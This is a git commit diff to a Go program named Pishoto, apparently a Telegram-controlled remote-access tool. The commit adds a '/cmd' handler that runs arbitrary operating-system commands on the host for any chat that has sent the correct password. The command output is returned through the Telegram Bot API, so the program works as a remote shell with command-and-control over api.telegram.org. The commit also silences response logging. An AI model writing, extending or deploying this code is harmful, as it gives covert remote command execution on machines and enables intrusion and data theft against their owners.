edac447a10ed12b230d88898cb9a2b2513fedfe4
Itay Migdal <32266629+itaymigdal@users.noreply.github.com>
2024-09-10 22:25:53 +0300

    sending commands

--- Pishoto.go
+++ Pishoto.go
@@ -1,16 +1,18 @@
 package main
 
 import (
+	_ "embed"
 	"io"
 	"fmt"
 	"log"
 	"bytes"
 	"strconv"
+	"strings"
+	"os/exec"
 	"net/http"
 	"crypto/md5"
-    "encoding/hex"
+	"encoding/hex"
 	"encoding/json"
-	_ "embed"
 )
 
 var (
@@ -18,7 +20,7 @@ var (
 	passMd5 string
 	//go:embed bot_token
 	botToken string
-	chatIDs []int64
+	chatIDs  []int64
 	baseURL  = "https://api.telegram.org/bot" + botToken + "/"
 )
 
@@ -46,29 +48,28 @@ type Response struct {
 }
 
 func md5Hash(text string) string {
-    // Create a new MD5 hash object
-    hash := md5.New()
+	// Create a new MD5 hash object
+	hash := md5.New()
 
-    // Write the string data to the hash object
-    hash.Write([]byte(text))
+	// Write the string data to the hash object
+	hash.Write([]byte(text))
 
-    // Compute the MD5 checksum
-    checksum := hash.Sum(nil)
+	// Compute the MD5 checksum
+	checksum := hash.Sum(nil)
 
-    // Convert the checksum to a hexadecimal string
-    return hex.EncodeToString(checksum)
+	// Convert the checksum to a hexadecimal string
+	return hex.EncodeToString(checksum)
 }
 
 func contains[T comparable](slice []T, item T) bool {
-    for _, v := range slice {
-        if v == item {
-            return true
-        }
-    }
-    return false
+	for _, v := range slice {
+		if v == item {
+			return true
+		}
+	}
+	return false
 }
 
-// SendMessage sends a message to the specified chat ID
 func SendMessage(chatID int64, text string) error {
 	url := baseURL + "sendMessage"
 	payload := map[string]interface{}{
@@ -88,12 +89,12 @@ func SendMessage(chatID int64, text string) error {
 	defer resp.Body.Close()
 
 	body, _ := io.ReadAll(resp.Body)
-	log.Printf("SendMessage Response: %s", body)
+	_ = body
+	// log.Printf("SendMessage Response: %s", body)
 
 	return nil
 }
 
-// GetUpdates fetches updates from the Telegram API
 func GetUpdates(offset int) (Response, error) {
 	url := baseURL + "getUpdates?offset=" + strconv.Itoa(offset)
 	resp, err := http.Get(url)
@@ -116,6 +117,31 @@ func GetUpdates(offset int) (Response, error) {
 	return response, nil
 }
 
+func executeCommand(commandParts []string) string {
+
+	// Execute the command using the first element as the command and the rest as arguments
+	cmd := exec.Command(commandParts[0], commandParts[1:]...)
+
+	// Get the combined output (stdout + stderr)
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return fmt.Sprintf("error: %v", err)
+	}
+
+	// Return the output as a string
+	return string(output)
+}
+
+func parseCommand(text string, chatID int64) {
+	commandParts := strings.Split(text, " ")
+	commandType := commandParts[0]
+	switch commandType {
+	case "/cmd":
+		output := executeCommand(commandParts[1:])
+		SendMessage(chatID, output)
+	}
+}
+
 func main() {
 	fmt.Println("Bot started. Press Ctrl+C to stop.")
 	offset := 0
@@ -130,19 +156,19 @@ func main() {
 			offset = update.UpdateID + 1
 			chatID := update.Message.Chat.ID
 			text := update.Message.Text
-			// fmt.Printf("Received message: %s\n", text)
-			if md5Hash(text) == passMd5 {
+			if contains(chatIDs, chatID) {
+				parseCommand(text, chatID)
+			} else if md5Hash(text) == passMd5 {
 				fmt.Println("Password answered in Chat ID:", chatID)
 				chatIDs = append(chatIDs, chatID)
-			}
-			
-			if contains(chatIDs, chatID) {
-				// Echo the received message back to the user
-				responseText := "You said: " + text
+				responseText := "Password confirmed. Pishoto is welcoming you :)"
 				err := SendMessage(chatID, responseText)
 				if err != nil {
 					log.Fatalf("Error sending message: %v", err)
 				}
+			} else {
+				responseText := "Wrong password."
+				SendMessage(chatID, responseText)
 			}
 		}
 	}
